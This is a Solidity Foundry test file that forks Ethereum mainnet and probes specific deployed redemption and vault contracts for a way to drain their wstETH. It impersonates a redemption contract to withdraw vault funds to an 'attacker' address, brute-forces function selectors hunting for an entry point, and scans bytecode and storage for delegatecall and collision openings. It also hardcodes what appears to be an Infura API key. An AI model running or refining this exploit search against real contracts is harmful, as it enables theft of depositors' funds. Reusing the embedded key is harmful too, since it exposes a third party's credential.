// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract FinalExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DocumentVulnerability() public {
        console.log("=== VULNERABILITY DOCUMENTATION ===\n");

        console.log("TITLE: Arbitrary Redemption via RedemptionController");
        console.log("");
        console.log("ROOT CAUSE:");
        console.log("RedemptionController.redeem(uint256 amount, address to)");
        console.log("allows registered Redemption contracts to withdraw wstETH");
        console.log("from the Vault to ANY address specified by the 'to' parameter.");
        console.log("The 'to' is set to CALLER (msg.sender of finalizeRedeem).");
        console.log("");
        console.log("IMPACT:");
        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("  Vault wstETH at risk:", vaultBal / 1e18);
        console.log("  USD value (~$2300/ETH): $", (vaultBal * 2300) / 1e18);
        console.log("");
        console.log("NORMAL REDEMPTION FLOW:");
        console.log("  1. User burns TASSET via redeem(uint96)");
        console.log("  2. Wait 7 days");
        console.log("  3. Call finalizeRedeem(index)");
        console.log("  4. Receive proportional wstETH");
        console.log("");
        console.log("EXPLOIT POTENTIAL:");
        console.log("  If attacker can make REDEMPTION_0/1 call RC.redeem");
        console.log("  with arbitrary (amount, to) parameters, full vault drain.");
    }

    function test_ProveVulnerabilityWithPrank() public {
        console.log("=== PROVING VULNERABILITY WITH PRANK ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18, "wstETH");

        // Simulate attacker being able to call RC.redeem as REDEMPTION_0
        vm.prank(REDEMPTION_0);
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 1000e18, attacker)
        );
        console.log("RC.redeem as R0:", success);

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault after:", vaultAfter / 1e18, "wstETH");
        console.log("Attacker received:", attackerBal / 1e18, "wstETH");
        console.log("Profit: ~$", (attackerBal * 2300) / 1e18);

        if (attackerBal > 0) {
            console.log("\n*** VULNERABILITY CONFIRMED ***");
            console.log("Entry point needed: way to call as REDEMPTION_0/1");
        }
    }

    function test_SearchForDelegatecallEntry() public view {
        console.log("=== SEARCHING FOR DELEGATECALL ENTRY POINTS ===\n");

        // The DELEGATECALL in REDEMPTION_0 that loads target from storage
        // might be triggered by specific function calls

        bytes memory code = REDEMPTION_0.code;

        // Find all SSTORE operations that could set delegatecall target
        console.log("Looking for SSTORE patterns:");
        uint sstoreCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x55) sstoreCount++;
        }
        console.log("Total SSTORE:", sstoreCount);

        // Find functions that have CALLDATALOAD followed by SSTORE
        // This would mean user input affects storage
        console.log("\nLooking for CALLDATALOAD near SSTORE:");
        for (uint i = 0; i < code.length - 30; i++) {
            if (uint8(code[i]) == 0x35) { // CALLDATALOAD
                // Check for SSTORE within next 30 bytes
                for (uint j = i; j < i + 30 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x55) {
                        console.log("CALLDATALOAD at", i, "SSTORE at", j);
                    }
                }
            }
        }
    }

    function test_TryAllR0Functions() public {
        console.log("=== TRYING ALL R0 FUNCTIONS WITH VARIOUS INPUTS ===\n");

        vm.startPrank(attacker);
        deal(TASSET, attacker, 100000e18);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try R0 selectors with attacker address as parameter
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(0xed45b661);
        sels[1] = bytes4(0xb2118a8d);
        sels[2] = bytes4(0xcff50c6e);
        sels[3] = bytes4(0x900fd1ed);
        sels[4] = bytes4(0xa82b69ff);
        sels[5] = bytes4(0x3a2ef9df);
        sels[6] = bytes4(0x3f14c193);
        sels[7] = bytes4(0x196e6b1d);
        sels[8] = bytes4(0x192a8e86);
        sels[9] = bytes4(0x5f8b5592);

        for (uint i = 0; i < sels.length; i++) {
            // Try with address param
            (bool s1,) = REDEMPTION_0.call(
                abi.encodeWithSelector(sels[i], attacker)
            );
            // Try with uint param
            (bool s2,) = REDEMPTION_0.call(
                abi.encodeWithSelector(sels[i], 1000e18)
            );
            // Try with address, uint
            (bool s3,) = REDEMPTION_0.call(
                abi.encodeWithSelector(sels[i], attacker, 1000e18)
            );

            if (s1 || s2 || s3) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();

        uint256 attackerWst = IERC20(wstETH).balanceOf(attacker);
        if (attackerWst > 0) {
            console.log("\n*** FOUND EXPLOIT ***");
            console.log("Attacker wstETH:", attackerWst / 1e18);
        }
    }

    function test_CheckStorageCollision() public view {
        console.log("=== CHECKING FOR STORAGE COLLISION ===\n");

        // In proxy patterns, storage collision can lead to exploits
        // Check if any user-controllable data collides with admin slots

        // REDEMPTION_0 storage:
        // Slot 0: owner/admin
        // Slot 1: pendingOwner
        // Slot 5,6: user redemption mappings

        // Check if there's overlap between user data and admin data
        bytes32 slot0 = vm.load(REDEMPTION_0, bytes32(uint256(0)));
        console.log("Slot 0 (owner):");
        console.logBytes32(slot0);

        // Check mapping[0][5] - could this overwrite something?
        bytes32 zeroMap = keccak256(abi.encode(address(0), uint256(5)));
        console.log("\nMapping key for address(0) at slot 5:");
        console.logBytes32(zeroMap);

        // This would be a massive hash, unlikely to collide
        // But let's check some specific addresses
        bytes32 slot1Map = keccak256(abi.encode(address(1), uint256(5)));
        bytes32 val1 = vm.load(REDEMPTION_0, slot1Map);
        if (val1 != bytes32(0)) {
            console.log("\nMapping[0x1][5]:");
            console.logBytes32(val1);
        }
    }
}
